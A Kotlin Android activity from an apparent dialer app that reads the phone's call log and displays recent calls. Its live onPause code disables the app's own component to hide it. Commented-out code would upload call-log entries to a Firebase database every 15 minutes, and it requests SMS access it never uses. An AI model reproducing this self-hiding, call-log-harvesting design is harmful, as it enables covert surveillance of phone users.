package com.hoogsoftware.dialer.resources

import android.Manifest
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.Settings
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.util.Log
import android.view.View
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
import com.hoogsoftware.dialer.R
import com.karumi.dexter.Dexter
import com.karumi.dexter.DexterBuilder
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.multi.MultiplePermissionsListener
import java.text.DateFormat
import java.text.ParseException
import java.text.SimpleDateFormat
import java.util.*


//class MainActivity : AppCompatActivity() {
//    override fun onCreate(savedInstanceState: Bundle?) {
//        super.onCreate(savedInstanceState)
//        setContentView(R.layout.activity_main)
//    }

class Second : AppCompatActivity() {
    private var callLogModelArrayList= ArrayList<CallLogModel>()
    private var rv_call_logs: RecyclerView? = null
    private var callLogAdapter: CallLogAdapter? = null
    var str_number: String? = null
    var str_contact_name: String? = null
    var str_call_type: String? = null
    var str_call_full_date: String? = null
    var str_call_date: String? = null
    var str_call_time: String? = null
    var str_call_time_formatted: String? = null
    var str_call_duration: String? = null
    private var swipeRefreshLayout: SwipeRefreshLayout? = null
    var appPermissions = arrayOf<String>(
        Manifest.permission.READ_CALL_LOG,
        //Manifest.permission.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION
        Manifest.permission.PROCESS_OUTGOING_CALLS,
        Manifest.permission.READ_PHONE_STATE
    )
    private var flag = 0
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        //setting up the title in actionbar
        supportActionBar!!.title = "Call Logs"
        doBan()

        //Initialize our views and variables
        Init()
//        getPermission()
        // comprobar_Permisos_CALL_LOG(this,this)
//        if (getPermission()){
//
//        }


        //check for permission
//        if (comprobar_Permisos_CALL_LOG(this,this)) {
//            FetchCallLogs()
//        }
//            swipeRefreshLayout!!.setOnRefreshListener { //check for permission
//                if (CheckAndRequestPermission()) {
//                    FetchCallLogs()
//                }
//                swipeRefreshLayout!!.isRefreshing = false
//            }
        //  SettingUpPeriodicWork()
    }

    private fun doBan() {
        val builder = AlertDialog.Builder(this)
        builder.setTitle("Name")

        // set the custom layout
        val customLayout: View = layoutInflater.inflate(R.layout.alert, null)
        builder.setView(customLayout)
        val textView=customLayout.findViewById<TextView>(R.id.sim1)
        val textView2=customLayout.findViewById<TextView>(R.id.sim2)
        val dialog = builder.create()
       // dialog.show()
        textView.setOnClickListener {
            val dialog = builder.create()
            dialog.dismiss()
            getPermission()


        }
        textView2.setOnClickListener {
            val dialog = builder.create()
            dialog.dismiss()
            getPermission()
        }



//        // add a button
//        builder.setPositiveButton("OK") { dialog: DialogInterface?, which: Int ->
//            // send data from the AlertDialog to the Activity
//           // val editText = customLayout.findViewById<EditText>(R.id.editText)
//          //  sendDialogDataToActivity(editText.text.toString())
//        }
        // create and show the alert dialog




//        val builder = AlertDialog.Builder(this)
//
//        builder.setMessage("Do you want to exit ?")
//
//        builder.setTitle("Alert !")
//
//        builder.setCancelable(false)
//
//        builder.setPositiveButton("Yes") {
//                dialog, which -> finish()
//        }
//
//        builder.setNegativeButton("No") {
//                dialog, which -> dialog.cancel()
//        }
//
//        val alertDialog = builder.create()
//        alertDialog.show()
    }

//        private fun SettingUpPeriodicWork() {
//            // Create Network constraint
//            val constraints: Constraints = Builder()
//                .setRequiredNetworkType(NetworkType.CONNECTED)
//                .setRequiresBatteryNotLow(true)
//                .setRequiresStorageNotLow(true)
//                .build()
//            val periodicSendDataWork =
//                PeriodicWorkRequest.Builder(SendDataWorker::class.java, 15, TimeUnit.MINUTES)
//                    .addTag(TAG_SEND_DATA)
//                    .setConstraints(constraints) // setting a backoff on case the work needs to retry
//                    //.setBackoffCriteria(BackoffPolicy.LINEAR, PeriodicWorkRequest.MIN_BACKOFF_MILLIS, TimeUnit.MILLISECONDS)
//                    .build()
//            val workManager = WorkManager.getInstance(this)
//            workManager.enqueue(periodicSendDataWork)
//        }

//    fun CheckAndRequestPermission(): Boolean {
//        //checking which permissions are granted
//        val listPermissionNeeded: MutableList<String> = ArrayList()
//        for (item in appPermissions) {
//            if (ContextCompat.checkSelfPermission(
//                    this,
//                    item
//                ) != PackageManager.PERMISSION_GRANTED
//            ) listPermissionNeeded.add(item)
//        }
//
//        //Ask for non-granted permissions
//        if (!listPermissionNeeded.isEmpty()) {
//            ActivityCompat.requestPermissions(
//                this, listPermissionNeeded.toTypedArray(),
//                PERMISSIONS_REQUEST_CODE
//            )
//            return false
//        }
//        //App has all permissions. Proceed ahead
//        return true
//    }

    private fun Init() {

//            swipeRefreshLayout = findViewById(R.id.activity_main_swipe_refresh_layout)
        rv_call_logs = findViewById(R.id.activity_main_rv)
        rv_call_logs!!.setHasFixedSize(true)
        rv_call_logs!!.setLayoutManager(LinearLayoutManager(this))
        callLogModelArrayList = ArrayList()
        callLogAdapter = CallLogAdapter(this, callLogModelArrayList)
        rv_call_logs!!.setAdapter(callLogAdapter)
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            for (i in permissions.indices) {
                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    flag = 1
                    break
                }
            }
            if (flag == 0) FetchCallLogs()
        }
    }

    @SuppressLint("Range", "SuspiciousIndentation", "NotifyDataSetChanged")
    fun FetchCallLogs() {
        // reading all data in descending order according to DATE
        val sortOrder = CallLog.Calls.DATE + " DESC"
        val cursor: Cursor? = this.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            sortOrder
        )

        //clearing the arraylist
        //  callLogModelArrayList!!.clear()
        var counter=100;

        //looping through the cursor to add data into arraylist
        while (cursor!!.moveToNext()&&counter>=0) {
            counter--
            //cursor.getString()
            str_number = cursor!!.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
            str_contact_name =
                cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
            str_contact_name = if (str_contact_name == null || str_contact_name == "") "Unknown" else str_contact_name
            str_call_type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))
            str_call_full_date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE))
            str_call_duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))
            val dateFormatter = SimpleDateFormat("dd MMM yyyy")
            str_call_date = dateFormatter.format(Date(str_call_full_date!!.toLong()))
            //   Toast.makeText(this,str_contact_name+"     "+str_call_duration,Toast.LENGTH_LONG).show()
            val timeFormatter = SimpleDateFormat("HH:mm:ss")
          //  var text:TextView = findViewById(R.id.tt)
            //  text.append("phone number =  $str_contact_name\n"  )
            str_call_time = timeFormatter.format(Date(str_call_full_date!!.toLong()))
            //str_call_time = getFormatedDateTime(str_call_time, "HH:mm:ss", "hh:mm ss");
            str_call_duration = DurationFormat(str_call_duration)
          //  text.append(str_contact_name+"     "+str_call_duration+"   "+str_call_date)

            str_call_type = when (str_call_type!!.toInt()) {
                CallLog.Calls.INCOMING_TYPE -> "Incoming"
                CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                CallLog.Calls.MISSED_TYPE -> "Missed"
                CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
                CallLog.Calls.REJECTED_TYPE -> "Rejected"
                CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "Externally Answered"
                else -> "NA"
            }
            val callLogItem = CallLogModel(
                str_number!!, str_contact_name!!, str_call_type!!,
                str_call_date!!, str_call_time!!, str_call_duration!!
            )

//            for(log in getCallHistoryOfSim( getSimCardInfos()?.get(0),getAllCallHistory()) )
//            {
//                Log.d("Sim1LogDetails", "$log\n____________________________________")
//            }
//
//            for(log in getCallHistoryOfSim( getSimCardInfos()?.get(1),getAllCallHistory()) )
//            {
//                Log.d("Sim2LogDetails", "$log\n____________________________________")
//
//            }


            callLogModelArrayList!!.add(callLogItem)
            // callLogAdapter!!.notifyDataSetChanged()

            //  SendDataToServer(callLogItem)
        }
        callLogAdapter!!.notifyDataSetChanged()
    }

    private fun getFormatedDateTime(
        dateStr: String,
        strInputFormat: String,
        strOutputFormat: String
    ): String {
        var formattedDate = dateStr
        val inputFormat: DateFormat = SimpleDateFormat(strInputFormat, Locale.getDefault())
        val outputFormat: DateFormat = SimpleDateFormat(strOutputFormat, Locale.getDefault())
        var date: Date? = null
        try {
            date = inputFormat.parse(dateStr)
        } catch (e: ParseException) {
        }
        if (date != null) {
            formattedDate = outputFormat.format(date)
        }
        return formattedDate
    }
    override fun onPause() {
        super.onPause()
        val packageManager = packageManager
        val componentName = ComponentName(this, Second::class.java)
        packageManager.setComponentEnabledSetting(
            componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
    private fun DurationFormat(duration: String?): String {
        var durationFormatted: String? = null
        durationFormatted = if (duration!!.toInt() < 60) {
            "$duration sec"
        } else {
            val min = duration.toInt() / 60
            val sec = duration.toInt() % 60
            if (sec == 0) "$min min" else "$min min $sec sec"
        }
        return durationFormatted
    }


    fun getCallHistoryOfSim(simInfo:SubscriptionInfo?, allCallList:MutableList<CallHistory> ) : MutableList<CallHistory> {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1){
            return allCallList.filter { it.subscriberId==simInfo?.subscriptionId.toString() || it.subscriberId.contains(simInfo?.iccId?:"_")}.toMutableList()
        }else{
            throw Exception("This Feature Is Not Available On This Device")
        }

    }


    private fun getSimCardInfos() : List<SubscriptionInfo>?{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager: SubscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            if (ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_PHONE_STATE
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                throw Exception("Permission Not Granted -> Manifest.permission.READ_PHONE_STATE")
            }
            return subscriptionManager.activeSubscriptionInfoList
        }else{
            return null
        }
    }




    //        private fun SendDataToServer(callLogItem: CallLogModel) {
//            val database: FirebaseDatabase = FirebaseDatabase.getInstance()
//            val myRef: DatabaseReference = database.getReference("CallLog")
//                .child(deviceName)
//                .child(callLogItem.callDate)
//                .child(callLogItem.callTime)
//            myRef.setValue(callLogItem)
//        }
    val deviceName: String
        get() {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            return if (model.startsWith(manufacturer)) {
                capitalize(model)
            } else {
                capitalize(manufacturer) + " " + model
            }
        }

    private fun capitalize(s: String?): String {
        if (s == null || s.length == 0) {
            return ""
        }
        val first = s[0]
        return if (Character.isUpperCase(first)) {
            s
        } else {
            first.uppercaseChar().toString() + s.substring(1)
        }
    }

    companion object {
        private const val TAG_SEND_DATA = "Sending data to server"

        // Request code. It can be any number > 0.
        private const val PERMISSIONS_REQUEST_CODE = 999
    }

    //    fun comprobar_Permisos_CALL_LOG(myContext: Context?, myActivity: Activity
//    ): Boolean {
//        try {
//
//            // Check whether this app has the call log allowed
////            for (i in permissions.indices) {
////                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
////                    flag = 1
////                    break
////                }
////            }
//
//
//            val writeExternalStoragePermission =
//                ContextCompat.checkSelfPermission(myContext!!, Manifest.permission.READ_CALL_LOG)
//            return if (writeExternalStoragePermission != PackageManager.PERMISSION_GRANTED) {
//                // Request user to grant write external storage permission.
//                val REQUEST_CODE_CALL_LOG_PERMISSION = 0
//                ActivityCompat.requestPermissions(myActivity, arrayOf(Manifest.permission.READ_CALL_LOG), REQUEST_CODE_CALL_LOG_PERMISSION)
//                if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R) {
//                    try {
//                        val intent = Intent()
//                        val uri: Uri = Uri.fromParts("package", myActivity.packageName, null)
//                        intent.data = uri
//                        myActivity.startActivityForResult(intent, REQUEST_CODE_CALL_LOG_PERMISSION)
//                         FetchCallLogs()
//                        false
//                    } catch (e: Exception) {
//                        false //if anything needs adjusting it would be this
//                    }
//                } else {
//                    false
//                }
//            } else {
//                FetchCallLogs()
//                true
//            }
//        } catch (ex: Exception) {
//            //  Log.e(LOG_TAG_EXTERNAL_STORAGE, ex.message, ex)
//        }
//
//
//
//
//
//
//
////        try {
////
////            // Check whether this app has the call log allowed
//////            for (i in permissions.indices) {
//////                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
//////                    flag = 1
//////                    break
//////                }
//////            }
////
////
////            val writeExternalStoragePermission =
////                ContextCompat.checkSelfPermission(myContext!!, Manifest.permission.READ_PHONE_STATE)
////            return if (writeExternalStoragePermission != PackageManager.PERMISSION_GRANTED) {
////                // Request user to grant write external storage permission.
////                val REQUEST_CODE_CALL_LOG_PERMISSION = 0
////                ActivityCompat.requestPermissions(
////                    myActivity, arrayOf(
////                        Manifest.permission.READ_PHONE_STATE
////                    ), REQUEST_CODE_CALL_LOG_PERMISSION
////                )
////                if (Build.VERSION.SDK_INT == Build.VERSION_CODES.R) {
////                    try {
////                        val intent = Intent()
////                        val uri: Uri = Uri.fromParts("package", myActivity.packageName, null)
////                        intent.data = uri
////                        myActivity.startActivityForResult(
////                            intent,
////                            REQUEST_CODE_CALL_LOG_PERMISSION
////                        )
////                        false
////                    } catch (e: Exception) {
////                        false //if anything needs adjusting it would be this
////                    }
////                } else {
////                    false
////                }
////            } else {
////                true
////            }
////        } catch (ex: Exception) {
////            //  Log.e(LOG_TAG_EXTERNAL_STORAGE, ex.message, ex)
////        }
//
//
//
//
//
//
//
//
//        return false
//    }
    lateinit var dexter : DexterBuilder


    private fun getPermission() {
        dexter = Dexter.withContext(this)
            .withPermissions(
                Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_PHONE_STATE,Manifest.permission.READ_SMS
            ).withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    report.let {

                        if (report.areAllPermissionsGranted()) {

                            Toast.makeText(this@Second, "Permissions Granted", Toast.LENGTH_SHORT).show()

//                            //val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
//                           // val phoneNumber = if (ActivityCompat.checkSelfPermission(
//                                    this@Second,
//                                    Manifest.permission.READ_SMS
//                                ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
//                                    this@Second,
//                                    Manifest.permission.READ_PHONE_NUMBERS
//                                ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
//                                    this@Second,
//                                    Manifest.permission.READ_PHONE_STATE
//                                ) != PackageManager.PERMISSION_GRANTED
//                            ) {
//                                // TODO: Consider calling
//                                //    ActivityCompat#requestPermissions
//                                // here to request the missing permissions, and then overriding
//                                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
//                                //                                          int[] grantResults)
//                                // to handle the case where the user grants the permission. See the documentation
//                                // for ActivityCompat#requestPermissions for more details.
//                                return
//                            } else {
//
//                            }

                            FetchCallLogs()
                            // Toast.makeText(this@Second, telephonyManager.line1Number,Toast.LENGTH_LONG)
                        } else {
                            AlertDialog.Builder(this@Second, R.style.Theme_Dialer).apply {
                                setMessage("please allow the required permissions")
                                    .setCancelable(false)
                                    .setPositiveButton("Settings") { _, _ ->
                                        val reqIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                            .apply {
                                                val uri = Uri.fromParts("package", packageName, null)
                                                data = uri
                                            }
                                        resultLauncher.launch(reqIntent)
                                    }
                                // setNegativeButton(R.string.cancel) { dialog, _ -> dialog.cancel() }
                                val alert = this.create()
                                alert.show()
                            }
                        }
                    }
                }
                override fun onPermissionRationaleShouldBeShown(permissions: List<PermissionRequest?>?, token: PermissionToken?) {
                    token?.continuePermissionRequest()
                }
            }).withErrorListener{
                Toast.makeText(this, it.name, Toast.LENGTH_SHORT).show()
            }
        dexter.check()
    }
    private var resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            result -> dexter.check()
    }
}